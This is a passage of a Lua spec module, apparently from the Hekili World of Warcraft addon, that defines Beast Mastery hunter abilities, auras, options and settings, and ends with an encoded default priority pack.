            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,

            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        },


        -- Stags
        natures_grace = {
            id = 264266,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            toggle = "interrupts",

            startsCombat = true,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires enrage or magic debuff"
            end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
            end,
        }, ]]


        -- Utility
        mend_pet = {
            id = 136,
            cast = 0,
            cooldown = 10,
            gcd = "spell",

            startsCombat = false,

            usable = function ()
                if not pet.alive then return false, "requires a living pet" end
                return true
            end,
        },


        -- Hunter - Kyrian    - 308491 - resonating_arrow     (Resonating Arrow)
        resonating_arrow = {
            id = 308491,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            startsCombat = true,
            texture = 3565445,

            handler = function ()
                applyDebuff( "target", "resonating_arrow" )
                active_dot.resonating_arrow = active_enemies
                applyBuff( "resonating_arrow" )
                if legendary.pact_of_the_soulstalkers.enabled then applyBuff( "pact_of_the_soulstalkers" ) end
            end,

            toggle = "essences",

            auras = {
                resonating_arrow = {
                    id = 308498,
                    duration = 10,
                    max_stack = 1,
                },
                pact_of_the_soulstalkers = {
                    id = 356263,
                    duration = 10,
                    max_stack = 1,
                }
            }
        },

        -- Hunter - Necrolord - 325028 - death_chakram        (Death Chakram)
        death_chakram = {
            id = 325028,
            cast = 0,
            cooldown = 45,
            gcd = "spell",

            startsCombat = true,
            texture = 3578207,

            toggle = "essences",

            handler = function ()
                applyBuff( "death_chakram" )
            end,

            auras = {
                death_chakram = {
                    duration = 3.5,
                    tick_time = 0.5,
                    max_stack = 1,
                    generate = function( t, auraType )
                        local cast = action.death_chakram.lastCast or 0

                        if cast + class.auras.death_chakram.duration >= query_time then
                            t.name = class.abilities.death_chakram.name
                            t.count = 1
                            t.applied = cast
                            t.expires = cast + duration
                            t.caster = "player"
                            return
                        end
                        t.count = 0
                        t.applied = 0
                        t.expires = 0
                        t.caster = "nobody"
                    end
                }
            }
        },

        -- Hunter - Night Fae - 328231 - wild_spirits         (Wild Spirits)
        wild_spirits = {
            id = 328231,
            cast = 0,
            cooldown = 120,
            gcd = "spell",

            startsCombat = true,
            texture = 3636840,

            spend = 0,
            spendType = "focus",

            toggle = "essences",

            handler = function ()
                applyDebuff( "target", "wild_mark" )
                applyBuff( "wild_spirits" )
            end,

            disabled = function ()
                return covenant.night_fae and not IsSpellKnownOrOverridesKnown( 328231 ), "you have not finished your night_fae covenant intro"
            end,

            auras = {
                wild_mark = {
                    id = 328275,
                    duration = function () return conduit.spirit_attunement.enabled and 18 or 15 end,
                    max_stack = 1
                },
                wild_spirits = {
                    duration = function () return conduit.spirit_attunement.enabled and 18 or 15 end,
                    max_stack = 1,
                    generate = function( t )
                        local cast = action.wild_spirits.lastCast or 0
                        local up = cast + t.duration > state.query_time
        
                        t.name = t.name or class.abilities.wild_spirits.name
                        t.count = up and 1 or 0
                        t.expires = up and cast + t.duration or 0
                        t.applied = up and cast or 0
                        t.caster = "player"
                    end,
                }
            }
        },

        -- Hunter - Venthyr   - 324149 - flayed_shot          (Flayed Shot)
        flayed_shot = {
            id = 324149,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            startsCombat = true,
            texture = 3565719,

            toggle = "essences",

            handler = function ()
                applyDebuff( "target", "flayed_shot" )
            end,

            auras = {
                flayed_shot = {
                    id = 324149,
                    duration = 20,
                    max_stack = 1,
                },
                flayers_mark = {
                    id = 324156,
                    duration = 12,
                    max_stack = 1
                },
                pouch_of_razor_fragments = {
                    id = 356620,
                    duration = 6,
                    max_stack = 1,
                }
            }
        },


        -- Wailing Arrow (Sylvanas Legendary)
        wailing_arrow = {
            id = 355589,
            cast = 1.9,
            cooldown = 60,
            gcd = "spell",
            
            spend = 15,
            spendType = "focus",
            
            toggle = "cooldowns",

            startsCombat = true,
            
            handler = function ()
                interrupt()
                applyDebuff( "target", "wailing_arrow" )
            end,

            auras = {
                wailing_arrow = {
                    id = 355589,
                    duration = 5,
                    max_stack = 1,
                }
            }
        },
    } )


    spec:RegisterOptions( {
        enabled = true,

        potion = "spectral_agility",

        buffPadding = 0,

        nameplates = false,
        nameplateRange = 8,

        aoe = 3,

        damage = true,
        damageExpiration = 3,

        package = "Beast Mastery",
    } )


    spec:RegisterSetting( "barbed_shot_grace_period", 0.5, {
        name = "|T2058007:0|t Barbed Shot Grace Period",
        desc = "If set above zero, the addon (using the default priority or |cFFFFD100barbed_shot_grace_period|r expression) will recommend |T2058007:0|t Barbed Shot up to 1 global cooldown earlier.",
        icon = 2058007,
        iconCoords = { 0.1, 0.9, 0.1, 0.9 },
        type = "range",
        min = 0,
        max = 1,
        step = 0.01,
        width = "full"
    } )

    spec:RegisterSetting( "avoid_bw_overlap", false, {
        name = "Avoid |T132127:0|t Bestial Wrath Overlap",
        desc = "If checked, the addon will not recommend |T132127:0|t Bestial Wrath if the buff is already applied.",
        type = "toggle",
        width = "full"
    } )


    spec:RegisterPack( "Beast Mastery", 20210629, [[d8eNXbqirLEKuQKljQqTjrvFcP0OGsDkKIvjQa9krrZsPQULuQAxq(fG0WuQIJjqltu6zqj10GsIRjLY2KsfFdqrgNOc4CIkO1bLO3bLKO5jkCpLk7dq8pOKuoiHKAHaQEiGstekH6Iak4JIkKrcLK0jbuuRKqmtLQ0nHssyNsj(PuQudfkjvlLqs8ubnvPK(kGcnwcPolHK0ELQ)k0GbDyQwmbpMOjRKlJAZi5ZqXObYPvSAOeYRrQMTi3wk2nLFlz4a1XHsWYv55iMoPRdvBNq9DagVOIoVawpHeZxPSFvDpyV1E4YvU3s29Kn4EANS5quqGP90oyL2PhQbaZ9qWUKUJH7HM3W9qGZorFiwfor5lqpeShiv(Q3ApKu4NK7HGufmblbkqXmkiCbKSAakzAWtUoLjpNsbkzAKaThkGpjfy26c9WLRCVLS7jBW90ozZHOGat7PnSUh64kO66HHtdW2dbnRfBDHE4IjYEiWzNOpeRcNO8f4HyvXnLVxerWn(HzZH7)WS7jBWEyAikP3ApCXuoEs7T2BjyV1EOl1PSEOSWnLVibuP9q2CHeV6aVR9wY2BThYMlK4vh49qxQtz9q9CdlGpPrugdtKaQ0E4IjYBaRtz9WCu9qhe7Rh626HTEUHfWN0ik8dBbRoW(q24MHj7)qa8dxLrR(Wv9qf0qEivDpeCYdWh5HcS0Xj8dhL21df4hQv9qcyVPjWdDB9qa8dLUrR(WJ91Kc8Wwp3WcpKaMLd1iFOaoffb1dL3O8nEpm3hQ(HHv0qIGtEa(6AVfSU3ApKnxiXRoW7HYBu(gVhklXS5MIOh4g3Ey(hkRkTkagYjGzPglQOcIJaM0cDCJpg5H5FOSQ0QayOJjL56yyI(Dfa0Xn(yKhUT9WCFOSeZMBkIEGBC7H5FOSQ0QayiNaMLASOIkiocysl0Xn(yKEOl1PSEO0tPOl1PSyAiApmnenAEd3d1Bm6Ss6AVfSsV1EiBUqIxDG3dDPoL1dLEkfDPoLftdr7HPHOrZB4EOCr6AVL26T2dzZfs8Qd8EO8gLVX7HUuhXCKnUzyYdZ4Hz7HUuNY6HspLIUuNYIPHO9W0q0O5nCpKODT3s70BThYMlK4vh49q5nkFJ3dDPoI5iBCZWKhcKhgSh6sDkRhk9uk6sDklMgI2dtdrJM3W9qzIDXCx7Ape8XYQrW1ER9wc2BTh6sDkRhsWBAklcM1EiBUqIxDG31Elz7T2dDPoL1dfkvt8ksL8a8cWyyIALZX6HS5cjE1bEx7TG19w7HS5cjE1bEp08gUh6IcbKFojsvMglQi4caF9qxQtz9qxuiG8ZjrQY0yrfbxa4RR9wWk9w7HS5cjE1bEpe8XsNOrDA4EyquB9qxQtz9q1VOEo4EO8gLVX7HhUXu1HHrKcprvhgoYnc8rqS5cjE9WTThE4gtvhggzmHmgga(fGe1ZbdEmmrhmy)CfNGyZfs8QR9wAR3ApKnxiXRoW7HGpw6enQtd3ddIARh6sDkRhkWeD8ueW5kOEO8gLVX7H5(q1tSPiIKnnwurHuvleBUqIxpm)dZ9HhUXu1HHrKcprvhgoYnc8rqS5cjE11ElTtV1EiBUqIxDG3dbFS0jAuNgUhgeH19WftK3awNY6HI6fweorjpubXpCHFUoL9q3wpuwvAvaShwupuutaZs9Hf1dvq8dbgN06HUTEiw9BA80dbMnIoMujpuiWdvq8dx4NRtzpSOEOBpe3a5eLxpmhbSyXpeai2EOcIdq7XpeNWRhc(yz1i4k6HaNLooHFOOMaML6dlQhQG4hcmoP1dpEHlzYdZralw8dfc8WS7zpnK9FOcAipCipmicRFiHLLTiOEOl1PSEOtaZsnwurfehbmPvpuEJY349WCFOlk8nkJaFtJNIJr0XKkbXMlK41dZ)WCFitiSjzetiSj5yrfvqCKQK4KXWeNBiOghlQUhM)Hy)qglGpGbZlKlkeq(5KivzASOIGla89WTThM7dzSa(agmVqYaYuPxzJmkKCI(qA6AVfGPER9q2CHeV6aVhc(yPt0OonCpmiQTE4IjYBaRtz9qr9clcNOKhQG4hUWpxNYEOBRhkRkTka2dlQhcCMOJNEiW45kOh626HyvDrHFyr9qrfhd)qHapubXpCHFUoL9WI6HU9qCdKtuE9WCeWIf)qaGy7HkioaTh)qCcVEi4JLvJGROEOl1PSEOat0XtraNRG6HYBu(gVh6IcFJYiW304P4yeDmPsqS5cjE9W8pm3hYecBsgXecBsowurfehPkjozmmX5gcQXXIQ7H5Fi2pKXc4dyW8c5IcbKFojsvMglQi4caFpCB7H5(qglGpGbZlKmGmv6v2iJcjNOpKMU21EOmXUyU3AVLG9w7HUuNY6Hobml1yrfvqCeWKw9q2CHeV6aVR9wY2BThYMlK4vh49qxQtz9qb)e4vKaQ0EO8gLVX7Hc4uuiQJnrjach8dZ)qbCkke1XMOeaDCJpg5HzS7HyKREOmGmXr1pmSs6TeSR9wW6ER9q2CHeV6aVhkVr5B8Eig56HT)Hc4uuib2jAuMyxmJoUXhJ8qG8W9GY2wp0L6uwpSbpPdbuPDT3cwP3ApKnxiXRoW7HYBu(gVhE4gtvhggrk8evDy4i3iWhbXMlK41dZ)q1VOEoy0Xn(yKhMXdXixpm)dLvLwfadrL8Jrh34JrEygpeJC1dDPoL1dv)I65G7AVL26T2dzZfs8Qd8EOl1PSEivYpUhkVr5B8EO6xuphmch8dZ)Wd3yQ6WWisHNOQddh5gb(ii2CHeV6HPX4OC1dZ2wx7T0o9w7HS5cjE1bEpuEJY349qQsItEyMpu6enEmg2EygpKQK4euJNZEOl1PSE4IDfuucYPFEtx7Tam1BTh6sDkRhcysRib8CJs6HS5cjE1bEx7TKd0BThYMlK4vh49qxQtz9qb)e4vKaQ0EO8gLVX7Hu4Pu8yji)WWrDA4hMXdXixpm)dLvLwfadjWeD8ueW5ki0Xn(yKhUT9qzvPvbWqcmrhpfbCUccDCJpg5Hz8WGzFyMpeJC9W8pu9eBkIiztJfvuiv1cXMlK4vpugqM4O6hgwj9wc21El5WER9qxQtz9qbMOJNIaoxb1dzZfs8Qd8U2Bj4E6T2dDPoL1dpMuMRJHj63va6HS5cjE1bEx7TemyV1EiBUqIxDG3dL3O8nEpuaNIc5eWSuJfvubXratAHWb)WTThkueYdZ)qQbdinECJpg5Hz8WGT1dDPoL1djQ3aMxCx7TemBV1EOl1PSEiaFsJHj63va6HS5cjE1bEx7TeeR7T2dDPoL1dPsEaEfjGkThYMlK4vh4DT3sqSsV1EOl1PSEi9jLIeqL2dzZfs8Qd8U2BjyB9w7HUuNY6HsqtJZNhjGkThYMlK4vh4DT3sW2P3Ap0L6uwpuiv1IaIx9q2CHeV6aVR9wccm1BTh6sDkRh6Xg8BXxSOIYRaq6HS5cjE1bEx7TemhO3ApKnxiXRoW7HYBu(gVhkGtrHOo2eLaOJB8XipeipKZjlXvoQtd3dDPoL1df87CmCx7Temh2BThYMlK4vh49q5nkFJ3dPkjo5Ha5HYIOpmZh6sDkd1GN0HaQuKSiAp0L6uwpK(Ksrz1042QR9wYUNER9q2CHeV6aVhkVr5B8EOaoffsGj64PiGZvqOvbWE422dfkc5H5Fi1GbKgpUXhJ8WmEyB9qxQtz9qbhtSOI6ns6KU2BjBWER9qxQtz9W1CCuGDI2dzZfs8Qd8U2BjB2ER9q2CHeV6aVh6sDkRhk4NaVIeqL2dL3O8nEpu9ddRiDA4OwX1WpmJhMdF422dLG8ddtIuNl1Pmp9qG8WGOSpm)dLLTWhfjKQALyvhddInxiXREOmGmXr1pmSs6TeSR9wYI19w7HS5cjE1bEpuEJY349qQsItq60WrTInEoFygpeJC9WCWhMTh6sDkRhklHZJeqL21ElzXk9w7HS5cjE1bEpuEJY349Wd3yQ6WWisHNOQddh5gb(ii2CHeVE422dpCJPQddJmMqgdda)cqI65GbpgMOdgSFUItqS5cjE1dDPoL1dv)I65G7AVLST1BThYMlK4vh49q5nkFJ3dpCJPQddJmMqgdda)cqI65GbpgMOdgSFUItqS5cjE1dDPoL1dPoMfLXWe1Zb31ElzBNER9q2CHeV6aVhkVr5B8Ei2pKQK4KhM5dPkjobDmg2EyMpeR3ZdP5Hz8qQsItqnEo7HUuNY6H(jDJJADhBAx7ApuUi9w7TeS3ApKnxiXRoW7HYBu(gVhkRkTkagsGj64PiGZvqOJB8XipeipeR3tp0L6uwp0njt0ZtrPNsDT3s2ER9q2CHeV6aVhkVr5B8EOSQ0QayibMOJNIaoxbHoUXhJ8qG8qSEp9qxQtz9qQ5yHuvRU2BbR7T2dzZfs8Qd8EO8gLVX7Hy)qbCkkeGjTIeWZnkbHd(HBBpm3hklXS5MISbdins58dZ)qbCkkKtaZsnwurfehbmPfch8dZ)qbCkkKat0XtraNRGq4GFinpm)dX(HudgqA84gFmYdbYdLvLwfadjWhHp6JHbTWpxNYEyMpCHFUoL9WTThI9dv)WWkce7jfecSuFygpeRB7HBBpm3hQEInfrFsj(IJr0XKkInxiXRhsZdP5HBBpuOiKhM)HudgqA84gFmYdZ4HbX6EOl1PSEOaFe(OpgMU2BbR0BThYMlK4vh49q5nkFJ3dX(Hc4uuiatAfjGNBucch8d32EyUpuwIzZnfzdgqAKY5hM)Hc4uuiNaMLASOIkiocysleo4hM)Hc4uuibMOJNIaoxbHWb)qAEy(hI9dPgmG04Xn(yKhcKhkRkTkagsiv1ksHFbql8Z1PShM5dx4NRtzpCB7Hy)q1pmSIaXEsbHal1hMXdX62E422dZ9HQNytr0NuIV4yeDmPIyZfs86H08qAE422dfkc5H5Fi1GbKgpUXhJ8WmEyW2Ph6sDkRhkKQAfPWVaDT3sB9w7HUuNY6HPbdiLeXIWxyAyt7HS5cjE1bEx7T0o9w7HS5cjE1bEpuEJY349qbCkkKtaZsnwurfehbmPfch8d32Ei1GbKgpUXhJ8WmEy22Ph6sDkRhcU0PSU21Eir7T2BjyV1EOl1PSEOtaZsnwurfehbmPvpKnxiXRoW7AVLS9w7HS5cjE1bEpuEJY349qbCkke1XMOeaHd(H5FOaoffI6ytucGoUXhJ8Wm29qmYvp0L6uwpuWpbEfjGkTR9wW6ER9q2CHeV6aVhkVr5B8E4HBmvDyyePWtu1HHJCJaFeeBUqIxpm)dv)I65Grh34JrEygpeJC9W8puwvAvamevYpgDCJpg5Hz8qmYvp0L6uwpu9lQNdUR9wWk9w7HS5cjE1bEp0L6uwpKk5h3dL3O8nEpu9lQNdgHd(H5F4HBmvDyyePWtu1HHJCJaFeeBUqIx9W0yCuU6HzBRR9wAR3Ap0L6uwpuiv1IaIx9q2CHeV6aVR9wANER9qxQtz9qatAfjGNBuspKnxiXRoW7AVfGPER9qxQtz9qQKhGxrcOs7HS5cjE1bEx7TKd0BTh6sDkRhsFsPibuP9q2CHeV6aVR9wYH9w7HS5cjE1bEpuEJY349qzvPvbWqhtkZ1XWe97kaOJB8XipmJhIrUEy(hI9dZ9HQNytrCobNkYiMJeqLIyZfs86HBBpuaNIcjKQALWjkch8dP5HBBpm3hklXS5MIOh4g3E422dLvLwfadDmPmxhdt0VRaGoUXhJ8WTThkueYdZ)qQbdinECJpg5Hz8W26HUuNY6Ha8jngMOFxbOR9wcUNER9q2CHeV6aVhkVr5B8EOSQ0QayibMOJNIaoxbHoUXhJ8WmEyWSpmh8Hsq(HHjrQZL6uMNEyMpeJC9W8pu9eBkIiztJfvuiv1cXMlK41d32EifEkfpwcYpmCuNg(Hz8qmY1dZ)qzvPvbWqcmrhpfbCUccDCJpg5HBBpu9ddRiDA4OwX1WpmJhMd7HUuNY6Hc(jWRibuPDT3sWG9w7HS5cjE1bEpuEJY349qQsItEyMpu6enEmg2EygpKQK4euJNZEOl1PSE4IDfuucYPFEtx7TemBV1EiBUqIxDG3dL3O8nEpuaNIc5eWSuJfvubXratAHWb)WTThkueYdZ)qQbdinECJpg5Hz8WGT1dDPoL1djQ3aMxCx7TeeR7T2dDPoL1d9yd(T4lwur5vai9q2CHeV6aVR9wcIv6T2dzZfs8Qd8EO8gLVX7Hc4uuibMOJNIaoxbHWb)WTThkueYdZ)qQbdinECJpg5Hz8WG7Ph6sDkRhEmPmxhdt0VRa01ElbBR3ApKnxiXRoW7HYBu(gVhkRkTkagcWKwrc45gLGoUXhJ8qG8WGT9WTThklXS5MIOh4g3Ey(hI9dLvLwfadDmPmxhdt0VRaGoUXhJ8WmEyBpCB7HYQsRcGHoMuMRJHj63vaqh34JrEiqEy298qAE422dv)WWksNgoQvCn8dZ4HbB7HBBpe7hM7dLLy2Ctr2GbKgPC(H5FyUpuwIzZnfrpWnU9qA6HUuNY6HcmrhpfbCUcQR9wc2o9w7HUuNY6HsqtJZNhjGkThYMlK4vh4DT3sqGPER9qxQtz9q6tkfLvtJBREiBUqIxDG31ElbZb6T2dzZfs8Qd8EO8gLVX7Hc4uuibMOJNIaoxbHwfa7HBBpuOiKhM)HudgqA84gFmYdZ4HT1dDPoL1dfCmXIkQ3iPt6AVLG5WER9qxQtz9W1CCuGDI2dzZfs8Qd8U2Bj7E6T2dzZfs8Qd8EO8gLVX7Hy)qQsItEy7FOSi6dZ8HuLeNGogdBpmh8Hy)qzvPvbWq0NukkRMg3wOJB8XipS9pm4dP5Ha5HUuNYq0NukkRMg3wizr0hUT9qzvPvbWq0NukkRMg3wOJB8Xipeipm4dZ8HyKRhsZd32Ei2puaNIcjWeD8ueW5kieo4hUT9qbCkkKXeYyya4xasuphm4XWeDWG9ZvCcch8dP5H5FyUp8WnMQommcl4GtEKpEHBra(fRBXhInxiXRhUT9qHIqEy(hsnyaPXJB8XipmJhI19qxQtz9qzjCEKaQ0U2BjBWER9q2CHeV6aVhkVr5B8EOaoffcWKwrc45gLGWb)WTThkb5hgMePoxQtzE6Ha5HbrzFy(hklBHpksiv1kXQoggeBUqIx9qxQtz9qb)e4vKaQ0U2BjB2ER9q2CHeV6aVhkVr5B8EOaoffsGj64PiGZvqOvbWE422dfkc5H5Fi1GbKgpUXhJ8WmEyB9qxQtz9q)KUXrW4jc31ElzX6ER9q2CHeV6aVhkVr5B8E4HBmvDyyePWtu1HHJCJaFeeBUqIxpCB7HhUXu1HHrgtiJHbGFbir9CWGhdt0bd2pxXji2CHeV6HUuNY6HQFr9CWDT3swSsV1EiBUqIxDG3dL3O8nEp8WnMQommYyczmma8lajQNdg8yyIoyW(5kobXMlK4vp0L6uwpK6ywugdtuphCx7TKTTER9q2CHeV6aVhkVr5B8Ei2pKQK4KhM5dPkjobDmg2EyMpmyBpKMhMXdPkjob145Sh6sDkRh6N0noQ1DSPDTR9q9gJoRKER9wc2BThYMlK4vh49WcCpKWAp0L6uwpuSFJlK4EOypHZ9qbCkk0XKYCDmmr)Ucach8d32EOaoffYjGzPglQOcIJaM0cHdUhk2VO5nCpKeWKrCWDT3s2ER9q2CHeV6aVhwG7Hew7HUuNY6HI9BCHe3df7jCUhklXS5MIOh4g3Ey(hkGtrHoMuMRJHj63vaq4GFy(hkGtrHCcywQXIkQG4iGjTq4GF422dZ9HYsmBUPi6bUXThM)Hc4uuiNaMLASOIkiocysleo4EOy)IM3W9qIELHjscyYio4U2BbR7T2dzZfs8Qd8EybUhsyDO6HUuNY6HI9BCHe3df7x08gUhs0RmmrsatgpUXhJ0dL3O8nEpuaNIc5eWSuJfvubXratAHwfaRhk2t4CKteUhkRkTkagYjGzPglQOcIJaM0cDCJpgPhk2t4CpuwvAvam0XKYCDmmr)Uca64gFmYdZaR2dLvLwfad5eWSuJfvubXratAHoUXhJ01ElyLER9q2CHeV6aVhwG7HewhQEOl1PSEOy)gxiX9qX(fnVH7He9kdtKeWKXJB8Xi9q5nkFJ3dfWPOqobml1yrfvqCeWKwiCW9qXEcNJCIW9qzvPvbWqobml1yrfvqCeWKwOJB8Xi9qXEcN7HYQsRcGHoMuMRJHj63vaqh34Jr6AVL26T2dzZfs8Qd8EybUhsyDO6HUuNY6HI9BCHe3df7x08gUhscyY4Xn(yKEO8gLVX7HYsmBUPi6bUXTEOypHZror4EOSQ0QayiNaMLASOIkiocysl0Xn(yKEOypHZ9qzvPvbWqhtkZ1XWe97kaOJB8Xipeiy1EOSQ0QayiNaMLASOIkiocysl0Xn(yKU2BPD6T2dzZfs8Qd8EOl1PSEioHJJYnKEO8gLVX7Hy)q9gJoRinicKtI4eokGtr9WTThklXS5MIOh4g3Ey(hQ3y0zfPbrGCsuwvAvaShsZdZ)qSFOy)gxiXiIELHjscyYio4hM)Hy)WCFOSeZMBkIEGBC7H5FyUpuVXOZksZIa5KioHJc4uupCB7HYsmBUPi6bUXThM)H5(q9gJoRinlcKtIYQsRcG9WTThQ3y0zfPzrYQsRcGHoUXhJ8WTThQ3y0zfPbrGCseNWrbCkQhM)Hy)WCFOEJrNvKMfbYjrCchfWPOE422d1Bm6SI0GizvPvbWql8Z1PShcKDpuVXOZksZIKvLwfadTWpxNYEinpCB7H6ngDwrAqeiNeLvLwfa7H5FyUpuVXOZksZIa5KioHJc4uupm)d1Bm6SI0GizvPvbWql8Z1PShcKDpuVXOZksZIKvLwfadTWpxNYEinpCB7H5(qX(nUqIre9kdtKeWKrCWpm)dX(H5(q9gJoRinlcKtI4eokGtr9W8pe7hQ3y0zfPbrYQsRcGHw4NRtzpS9pSThMXdf734cjgrcyY4Xn(yKhUT9qX(nUqIrKaMmECJpg5Ha5H6ngDwrAqKSQ0QayOf(56u2db6dZ(qAE422d1Bm6SI0SiqojIt4Oaof1dZ)qSFOEJrNvKgebYjrCchfWPOEy(hQ3y0zfPbrYQsRcGHw4NRtzpei7EOEJrNvKMfjRkTkagAHFUoL9W8pe7hQ3y0zfPbrYQsRcGHw4NRtzpS9pSThMXdf734cjgrcyY4Xn(yKhUT9qX(nUqIrKaMmECJpg5Ha5H6ngDwrAqKSQ0QayOf(56u2db6dZ(qAE422dX(H5(q9gJoRinicKtI4eokGtr9WTThQ3y0zfPzrYQsRcGHw4NRtzpei7EOEJrNvKgejRkTkagAHFUoL9qAEy(hI9d1Bm6SI0SizvPvbWqh7Rapm)d1Bm6SI0SizvPvbWql8Z1PSh2(h22dbYdf734cjgrcyY4Xn(yKhM)HI9BCHeJibmz84gFmYdZ4H6ngDwrAwKSQ0QayOf(56u2db6dZ(WTThM7d1Bm6SI0SizvPvbWqh7Rapm)dX(H6ngDwrAwKSQ0QayOJB8XipS9pSThMXdf734cjgr0RmmrsatgpUXhJ8W8puSFJlKyerVYWejbmz84gFmYdbYdZUNhM)Hy)q9gJoRiniswvAvam0c)CDk7HT)HT9WmEOy)gxiXisatgpUXhJ8WTThQ3y0zfPzrYQsRcGHoUXhJ8W2)W2EygpuSFJlKyejGjJh34JrEy(hQ3y0zfPzrYQsRcGHw4NRtzpS9pm4EEyMpuSFJlKyejGjJh34JrEygpuSFJlKyerVYWejbmz84gFmYd32EOy)gxiXisatgpUXhJ8qG8q9gJoRiniswvAvam0c)CDk7Ha9HzF422df734cjgrcyYio4hsZd32EOEJrNvKMfjRkTkag64gFmYdB)dB7Ha5HI9BCHeJi6vgMijGjJh34JrEy(hI9d1Bm6SI0GizvPvbWql8Z1PSh2(h22dZ4HI9BCHeJi6vgMijGjJh34JrE422dZ9H6ngDwrAqeiNeXjCuaNI6H5Fi2puSFJlKyejGjJh34JrEiqEOEJrNvKgejRkTkagAHFUoL9qG(WSpCB7HI9BCHeJibmzeh8dP5H08qAEinpKMhsZd32EO6hgwr60WrTIRHFygpuSFJlKyejGjJh34JrEinpCB7H5(q9gJoRinicKtI4eokGtr9W8pm3hklXS5MIOh4g3Ey(hI9d1Bm6SI0SiqojIt4Oaof1dZ)qSFi2pm3hk2VXfsmIeWKrCWpCB7H6ngDwrAwKSQ0QayOJB8XipeipSThsZdZ)qSFOy)gxiXisatgpUXhJ8qG8WS75HBBpuVXOZksZIKvLwfadDCJpg5HT)HT9qG8qX(nUqIrKaMmECJpg5H08qAE422dZ9H6ngDwrAweiNeXjCuaNI6H5Fi2pm3hQ3y0zfPzrGCsuwvAvaShUT9q9gJoRinlswvAvam0Xn(yKhUT9q9gJoRinlswvAvam0c)CDk7Haz3d1Bm6SI0GizvPvbWql8Z1PShsZdPPhssLs6H6ngDwd21Elat9w7HS5cjE1bEp0L6uwpeNWXr5gspuEJY349qSFOEJrNvKMfbYjrCchfWPOE422dLLy2Ctr0dCJBpm)d1Bm6SI0SiqojkRkTka2dP5H5Fi2puSFJlKyerVYWejbmzeh8dZ)qSFyUpuwIzZnfrpWnU9W8pm3hQ3y0zfPbrGCseNWrbCkQhUT9qzjMn3ue9a342dZ)WCFOEJrNvKgebYjrzvPvbWE422d1Bm6SI0GizvPvbWqh34JrE422d1Bm6SI0SiqojIt4Oaof1dZ)qSFyUpuVXOZksdIa5KioHJc4uupCB7H6ngDwrAwKSQ0QayOf(56u2dbYUhQ3y0zfPbrYQsRcGHw4NRtzpKMhUT9q9gJoRinlcKtIYQsRcG9W8pm3hQ3y0zfPbrGCseNWrbCkQhM)H6ngDwrAwKSQ0QayOf(56u2dbYUhQ3y0zfPbrYQsRcGHw4NRtzpKMhUT9WCFOy)gxiXiIELHjscyYio4hM)Hy)WCFOEJrNvKgebYjrCchfWPOEy(hI9d1Bm6SI0SizvPvbWql8Z1PSh2(h22dZ4HI9BCHeJibmz84gFmYd32EOy)gxiXisatgpUXhJ8qG8q9gJoRinlswvAvam0c)CDk7Ha9HzFinpCB7H6ngDwrAqeiNeXjCuaNI6H5Fi2puVXOZksZIa5KioHJc4uupm)d1Bm6SI0SizvPvbWql8Z1PShcKDpuVXOZksdIKvLwfadTWpxNYEy(hI9d1Bm6SI0SizvPvbWql8Z1PSh2(h22dZ4HI9BCHeJibmz84gFmYd32EOy)gxiXisatgpUXhJ8qG8q9gJoRinlswvAvam0c)CDk7Ha9HzFinpCB7Hy)WCFOEJrNvKMfbYjrCchfWPOE422d1Bm6SI0GizvPvbWql8Z1PShcKDpuVXOZksZIKvLwfadTWpxNYEinpm)dX(H6ngDwrAqKSQ0QayOJ9vGhM)H6ngDwrAqKSQ0QayOf(56u2dB)dB7Ha5HI9BCHeJibmz84gFmYdZ)qX(nUqIrKaMmECJpg5Hz8q9gJoRiniswvAvam0c)CDk7Ha9HzF422dZ9H6ngDwrAqKSQ0QayOJ9vGhM)Hy)q9gJoRiniswvAvam0Xn(yKh2(h22dZ4HI9BCHeJi6vgMijGjJh34JrEy(hk2VXfsmIOxzyIKaMmECJpg5Ha5Hz3ZdZ)qSFOEJrNvKMfjRkTkagAHFUoL9W2)W2EygpuSFJlKyejGjJh34JrE422d1Bm6SI0GizvPvbWqh34JrEy7FyBpmJhk2VXfsmIeWKXJB8Xipm)d1Bm6SI0GizvPvbWql8Z1PSh2(hgCppmZhk2VXfsmIeWKXJB8XipmJhk2VXfsmIOxzyIKaMmECJpg5HBBpuSFJlKyejGjJh34JrEiqEOEJrNvKMfjRkTkagAHFUoL9qG(WSpCB7HI9BCHeJibmzeh8dP5HBBpuVXOZksdIKvLwfadDCJpg5HT)HT9qG8qX(nUqIre9kdtKeWKXJB8Xipm)dX(H6ngDwrAwKSQ0QayOf(56u2dB)dB7Hz8qX(nUqIre9kdtKeWKXJB8XipCB7H5(q9gJoRinlcKtI4eokGtr9W8pe7hk2VXfsmIeWKXJB8XipeipuVXOZksZIKvLwfadTWpxNYEiqFy2hUT9qX(nUqIrKaMmId(H08qAEinpKMhsZdP5HBBpu9ddRiDA4OwX1WpmJhk2VXfsmIeWKXJB8XipKMhUT9WCFOEJrNvKMfbYjrCchfWPOEy(hM7dLLy2Ctr0dCJBpm)dX(H6ngDwrAqeiNeXjCuaNI6H5Fi2pe7hM7df734cjgrcyYio4hUT9q9gJoRiniswvAvam0Xn(yKhcKh22dP5H5Fi2puSFJlKyejGjJh34JrEiqEy298WTThQ3y0zfPbrYQsRcGHoUXhJ8W2)W2EiqEOy)gxiXisatgpUXhJ8qAEinpCB7H5(q9gJoRinicKtI4eokGtr9W8pe7hM7d1Bm6SI0GiqojkRkTka2d32EOEJrNvKgejRkTkag64gFmYd32EOEJrNvKgejRkTkagAHFUoL9qGS7H6ngDwrAwKSQ0QayOf(56u2dP5H00djPsj9q9gJoRz7Ax7ApumFKPSElz3t2G7PDYMd0db4NnggspeyuulQ0cWCl5iS8HpSvq8dNgW1PpKQUhsl4JLvJGR0(WJXc4ZXRhsQg(HoUwnUYRhkb5ggMGEr27y8dXky5db2YeZNYRhs7HBmvDyyKOP9HA9qApCJPQddJenInxiXlAFORpeyODV3hIDWCsd6fzVJXpeRGLpeyltmFkVEiThUXu1HHrIM2hQ1dP9WnMQomms0i2CHeVO9HyhmN0GEr27y8dBdlFiWwMy(uE9qAvpXMIenTpuRhsR6j2uKOr